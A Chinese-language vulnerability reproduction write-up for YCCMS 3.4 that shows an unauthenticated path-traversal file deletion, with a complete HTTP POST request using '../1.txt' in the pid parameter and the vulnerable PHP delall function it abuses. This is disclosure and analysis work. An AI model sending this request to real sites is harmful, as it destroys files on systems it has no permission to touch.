### 一、漏洞简介 ###

### 二、漏洞影响 ###

YCCMS 3.4

### 三、复现过程 ###
    POST /admin/?a=pic&m=delall HTTP/1.1
    Host: 127.0.0.1:8082
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 89
    Origin: http://127.0.0.1:8082
    Connection: close
    Referer: http://127.0.0.1:8082/admin/?a=pic
    Upgrade-Insecure-Requests: 1
    
    pid%5B0%5D=../1.txt&chkall=on&send=%E5%88%A0%E9%99%A4%E9%80%89%E4%B8%AD%E5%9B%BE%E7%89%87t
只需要更改pid[0]即可在无登录条件下任意删除文件，删除根目录下的1.txt
![](YCCMS3.4任意文件删除/20200510143520-6bc12876-9288-1.png)
已经删除成功了

![](YCCMS3.4任意文件删除/20200510143550-7d8c00bc-9288-1.png)

其实这还是犯了一个最容易犯的错误，没有对传进来的路径进行过滤就拼接了目录，导致了任意文件删除漏洞的产生
根据url定位到相关函数位置,位于/controller/PicAction.class.php

    public function delall(){
    if(isset($_POST['send'])){
    if(validate::isNullString($_POST['pid'])) tool::layer_alert('没有选择任何图片!','?a=pic',7);
    $_fileDir=ROOT_PATH.'/uploads/';
    foreach($_POST['pid'] as $_value){
    $_filePath=$_fileDir.$_value;
    if(!unlink($_filePath)){
    tool::layer_alert('图片删除失败,请设权限为777!','?a=pic',7);
    }else{
    header('Location:?a=pic');
    }
    }
    
    }
    
    }
对 pid传进来的值并没有进行过滤就进行了了路径的拼接，导致了路径穿越漏洞，触发任意文件删除漏洞

### 参考链接 
https://xz.aliyun.com/t/7748#toc-4